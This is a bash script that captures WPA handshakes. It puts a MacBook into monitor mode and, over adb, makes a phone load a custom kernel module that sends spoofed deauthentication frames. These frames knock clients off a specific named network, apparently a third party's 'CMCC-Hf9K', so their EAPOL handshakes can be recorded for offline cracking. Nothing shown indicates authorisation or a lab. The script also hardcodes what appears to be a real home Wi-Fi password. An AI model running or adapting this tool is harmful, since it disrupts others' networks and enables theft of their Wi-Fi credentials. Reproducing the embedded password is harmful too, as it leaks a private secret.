#!/bin/bash
# capture_mac.sh - MacBook monitor mode capture + phone deauth
#
# Run on MacBook. Uses en0 for monitor capture and phone (via adb) for deauth.
#
# Usage: sudo bash capture_mac.sh [rounds]

ROUNDS=${1:-5}
CHANNEL=11
PCAP="/tmp/cmcc_handshake.pcap"

echo "[*] CMCC-Hf9K Handshake Capture"
echo "[*] MacBook: en0 monitor on channel $CHANNEL"
echo "[*] Phone: spoofed deauth via petx5"
echo ""

# Check we're root
if [ "$(id -u)" != "0" ]; then
    echo "ERROR: Must run as root (sudo)"
    exit 1
fi

# Check adb
if ! adb devices 2>/dev/null | grep -q "device$"; then
    echo "ERROR: No adb device connected"
    exit 1
fi

# Disconnect MacBook WiFi (needed for monitor mode)
echo "[*] Disconnecting MacBook WiFi..."
networksetup -setairportpower en0 off
sleep 1
networksetup -setairportpower en0 on
sleep 1

# Start monitor mode capture on MacBook
echo "[*] Starting monitor mode capture on channel $CHANNEL..."
# tcpdump in monitor mode captures all 802.11 frames
tcpdump -I -i en0 -c 0 -w "$PCAP" --monitor-mode -y IEEE802_11_RADIO \
    "channel $CHANNEL" 2>/dev/null &
# Alternative: use airport sniff
# /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en0 sniff $CHANNEL &
CAPPID=$!
sleep 2

# Check if capture is running
if ! kill -0 $CAPPID 2>/dev/null; then
    echo "[*] tcpdump monitor failed, trying airport sniff..."
    /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport en0 sniff $CHANNEL &
    CAPPID=$!
    sleep 2
fi

echo "[*] Monitor capture running (PID=$CAPPID)"
echo ""

# Now run deauth rounds on phone
for round in $(seq 1 $ROUNDS); do
    echo "[Round $round/$ROUNDS] Sending deauths from phone..."

    adb shell "sudo bash -c '
        cd /tmp
        nmcli device disconnect wlan0 2>/dev/null
        sleep 0.3

        CONN_BEFORE=\$(dmesg | grep -c \"connected to 86:1a:24:5[8c]:59:1c\")

        nmcli device wifi connect 86:1A:24:58:59:1C password dummypassword12345678 ifname wlan0 2>/dev/null &
        PID=\$!

        OK=0
        for i in \$(seq 1 80); do
            CONN_NOW=\$(dmesg | grep -c \"connected to 86:1a:24:5[8c]:59:1c\")
            if [ \"\$CONN_NOW\" -gt \"\$CONN_BEFORE\" ]; then
                OK=1
                break
            fi
            sleep 0.05
        done

        if [ \$OK -eq 0 ]; then
            echo FAIL
            kill \$PID 2>/dev/null; wait \$PID 2>/dev/null
        else
            echo CONNECTED
            for b in 1 2 3 4 5; do
                rmmod kfind 2>/dev/null
                sleep 0.03
                insmod /tmp/petx5.ko 2>/dev/null && echo "deauth \$b OK" || break
                rmmod kfind 2>/dev/null
                sleep 0.06
            done
            kill \$PID 2>/dev/null; wait \$PID 2>/dev/null
        fi

        # Cleanup NM profile
        for prof in \$(nmcli -t -f NAME connection show 2>/dev/null | grep -i cmcc); do
            nmcli connection delete "\$prof" 2>/dev/null
        done

        # Reconnect home
        nmcli device wifi connect 8C:DE:F9:B3:9E:20 password 9006609b29404a ifname wlan0 2>/dev/null
    '" 2>&1 | sed 's/^/  /'

    echo "[Round $round/$ROUNDS] Waiting for client reconnection..."
    sleep 5
done

echo ""
echo "[*] Stopping capture..."
kill $CAPPID 2>/dev/null
wait $CAPPID 2>/dev/null
sleep 1

# Restore MacBook WiFi
echo "[*] Restoring MacBook WiFi..."
networksetup -setairportpower en0 off
sleep 1
networksetup -setairportpower en0 on
sleep 2

echo ""
echo "[*] === RESULTS ==="
if [ -f "$PCAP" ]; then
    echo "[*] Capture: $PCAP ($(du -h "$PCAP" | cut -f1))"
    echo "[*] EAPOL frames:"
    tcpdump -r "$PCAP" -e 'ether proto 0x888e' 2>/dev/null | head -20
    echo ""
    echo "[*] Total EAPOL: $(tcpdump -r "$PCAP" 'ether proto 0x888e' 2>/dev/null | wc -l)"
else
    # airport sniff saves to /tmp/airportSniffXXXXXX.cap
    SNIFF=$(ls -t /tmp/airportSniff*.cap 2>/dev/null | head -1)
    if [ -n "$SNIFF" ]; then
        echo "[*] Airport sniff capture: $SNIFF"
        cp "$SNIFF" "$PCAP"
        echo "[*] Copied to $PCAP"
        echo "[*] EAPOL frames:"
        tcpdump -r "$PCAP" 'ether proto 0x888e' 2>/dev/null | head -20
    else
        echo "[*] No capture file found!"
    fi
fi
echo "[*] Done."
